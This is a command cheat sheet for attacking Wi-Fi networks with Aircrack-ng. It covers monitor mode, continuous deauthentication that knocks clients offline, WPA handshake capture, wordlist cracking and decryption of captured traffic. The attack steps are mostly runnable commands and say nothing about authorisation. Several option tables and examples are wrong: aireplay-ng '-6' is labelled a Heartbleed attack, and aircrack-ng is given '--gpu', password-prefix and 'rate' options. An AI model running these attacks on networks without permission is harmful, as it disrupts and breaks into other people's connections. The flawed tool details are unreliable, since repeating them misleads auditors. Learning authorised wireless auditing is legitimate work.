# Wireless Network Penetration Testing

Airmon-ng and the Aircrack-ng suite are powerful tools for wireless network auditing and penetration testing. These tools allow you to monitor wireless traffic, capture packets, perform deauthentication attacks, and crack WEP/WPA/WPA2 encryption.

---
## Installation
### Linux (Debian/Ubuntu)

```bash
sudo apt update && sudo apt install aircrack-ng
```
### macOS

```bash
brew install aircrack-ng
```
### Verify Installation

```bash
airmon-ng --version
aircrack-ng --version
```
---
## Core Tools Overview

| Tool          | Purpose                                         |
| ------------- | ----------------------------------------------- |
| `airmon-ng`   | Enable monitor mode on wireless interface       |
| `airodump-ng` | Capture wireless network traffic and handshakes |
| `aireplay-ng` | Perform wireless attacks (deauth, replay, etc.) |
| `aircrack-ng` | Crack WEP/WPA/WPA2 passwords                    |
| `airdecap-ng` | Decrypt captured packets                        |

---
## Wireless Interfaces & Monitor Mode
### Check Available Interfaces

```bash
iwconfig
# or
iw dev
# or
ip link
```
### Enable Monitor Mode

```bash
sudo airmon-ng start <interface>
```

- Creates a monitor mode interface (e.g., `wlan0mon`)
- Required to capture wireless traffic
- Example: `sudo airmon-ng start wlan0`
### Check Monitor Mode Status

```bash
iwconfig
# Look for "Mode:Monitor"
```
### Disable Monitor Mode

```bash
sudo airmon-ng stop <monitor_interface>
# Example: sudo airmon-ng stop wlan0mon
```
### Alternative Method (iw)

```bash
# Enable monitor mode
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

# Disable monitor mode
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```
---
## Wireless Network Scanning
### Basic Network Discovery

```bash
sudo airodump-ng wlan0mon
```

- Shows all nearby networks
- Displays BSSID, channel, signal strength, encryption
- Press `Ctrl+C` to stop
- **Output columns:**
    - `BSSID`: MAC address of access point
    - `PWR`: Signal strength (lower = stronger)
    - `Beacons`: Packets sent by AP
    - `CH`: Channel number
    - `ENC`: Encryption type (WPA2, WPA, WEP, etc.)
    - `CIPHER`: Encryption cipher
    - `AUTH`: Authentication method
### Scan Specific Channel

```bash
sudo airodump-ng -c <channel> wlan0mon
```

- Example: `sudo airodump-ng -c 6 wlan0mon`
- Faster scanning of single channel
- Common channels: 1, 6, 11 (US), 1-13 (EU)
### Capture Traffic from Specific Network

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w <output_file> wlan0mon
```

- `-c`: Target channel
- `--bssid`: Target network MAC address
- `-w`: Output file (captures to `.cap` or `.pcapng`)
- **Example:**
    ```bash
    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
    ```
- Continues capturing until `Ctrl+C` pressed
- Creates files: `capture-01.cap`, `capture-01.csv`, etc.
### Capture with Additional Details

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan0mon
```
- `--output-format`: Set format (pcap, csv, or both)
---
## Deauthentication Attacks
### Send Deauth Packets to Clients

```bash
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

- `-0`: Deauthentication attack
- `10`: Number of deauth packets to send
- `-a`: Target AP BSSID
- **Effect**: Disconnects all clients from target network
- **Use case**: Force clients to reconnect and capture handshakes
### Send Deauth to Specific Client

```bash
sudo aireplay-ng -0 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon
```

- `-c`: Target client MAC address
- More discreet than broadcast deauth
- Targets specific device only
### Continuous Deauth (Aggressive)

```bash
sudo aireplay-ng -0 0 -a <BSSID> wlan0mon
```

- `-0 0`: Send deauth packets continuously (0 = infinite)
- Keeps clients disconnected
- Use with caution; can trigger alarms
- Stop with `Ctrl+C`
### Deauth with Interval Control

```bash
sudo aireplay-ng -0 50 -a <BSSID> --deauth-interval 1 wlan0mon
```

- `--deauth-interval 1`: Send one packet per second
- Less aggressive than rapid fire

---
## WPA/WPA2 Handshake Capture
### Capture 4-Way Handshake (WPA/WPA2)

```bash
# Terminal 1: Start capturing
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Terminal 2: Send deauth to force reconnection
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

- Monitor for "WPA handshake" message in airodump output
- Client must reconnect to capture handshake
- Takes 10-30 seconds typically
- Handshake data saves to `.cap` file
### Verify Handshake Captured

```bash
cowpatty -r handshake-01.cap -s <SSID> -c
```

- `-r`: Read capture file
- `-s`: Network SSID
- `-c`: Check for handshake
---
## Password Cracking
### Crack WPA/WPA2 with Wordlist

```bash
sudo aircrack-ng -w <wordlist> -b <BSSID> <output_file>.cap
```

- `-w`: Wordlist file (rockyou.txt, etc.)
- `-b`: Target BSSID
- Shows password if found in wordlist

### Crack with Multiple Wordlists

```bash
sudo aircrack-ng -w wordlist1.txt -w wordlist2.txt -b <BSSID> capture.cap
```

### Use GPU for Faster Cracking

```bash
# With CUDA support (NVIDIA)
sudo aircrack-ng -w wordlist.txt -b <BSSID> capture.cap --gpu
```

### Dictionary Attack Settings

```bash
sudo aircrack-ng -w wordlist.txt -b <BSSID> -p <known_password_prefix> capture.cap
```

- `-p`: Known password prefix (narrows search)

### Crack WEP

```bash
sudo aircrack-ng <capture_file>.cap
```

- WEP requires fewer packets (typically auto-cracks)
- No wordlist needed for WEP
- WEP is deprecated and considered broken

---
## Packet Decryption
### Decrypt Captured Packets

```bash
sudo airdecap-ng -w <password> -b <BSSID> <capture_file>.cap
```

- `-w`: WiFi password
- `-b`: Target BSSID
- Creates decrypted output file (`.cap`)
- Can then analyze with Wireshark

### Example Workflow

```bash
# Capture traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w traffic wlan0mon

# After cracking password, decrypt
sudo airdecap-ng -w "password123" -b AA:BB:CC:DD:EE:FF traffic-01.cap

# Analyze with Wireshark
wireshark traffic-01-dec.cap
```

---
## Common Options Reference
### airodump-ng Options

|Option|Description|
|---|---|
|`-c CHANNEL`|Target specific channel|
|`--bssid BSSID`|Target specific network|
|`-w FILE`|Write capture to file|
|`--output-format FORMAT`|Output format (pcap, csv, etc.)|
|`-a`|Filter by address|
|`--ignore-negative-one`|Ignore -1 power signals|
|`--manufacturer`|Show manufacturer info|
### aireplay-ng Options

|Option|Description|
|---|---|
|`-0`|Deauthentication attack|
|`-1`|Fake authentication|
|`-2`|Interactive packet replay|
|`-3`|ARP request replay|
|`-4`|Fragmentation attack|
|`-5`|Cafè Latte attack|
|`-6`|Heartbleed attack|
|`-a BSSID`|Target AP|
|`-c CLIENT_MAC`|Target client|

### aircrack-ng Options

|Option|Description|
|---|---|
|`-w WORDLIST`|Wordlist file|
|`-b BSSID`|Target BSSID|
|`-e SSID`|Known SSID|
|`-p PASSWORD_PREFIX`|Known password start|
|`--gpu`|Use GPU acceleration|
|`-q`|Quiet mode|
|`-r`|Enable rate|

---

## Quick Reference

```bash
# Setup
sudo airmon-ng start wlan0

# Scan
sudo airodump-ng wlan0mon

# Target specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth clients
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack password
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Cleanup
sudo airmon-ng stop wlan0mon
```

---

## Related Tools

- **[Hashcat](./Hashcat.md)** - Faster GPU-accelerated cracking (`-m 22000` for WPA handshakes)
- **[tshark](./tshark.md)** / **[tcpdump](./tcpdump.md)** - Inspect and carve the captured `.cap` files
- **Pyrit** - Alternative WPA/WPA2 cracking tool
- **Wireshark** - Packet analysis and decryption

---
## Resources

- [Aircrack-ng Official Documentation](https://www.aircrack-ng.org/)
- [Aircrack-ng Tutorial](https://www.aircrack-ng.org/doku.php?id=tutorial)
- [802.11 Wireless Security](https://en.wikipedia.org/wiki/IEEE_802.11)
- [WPA/WPA2 Vulnerability Info](https://www.krackattacks.com/)
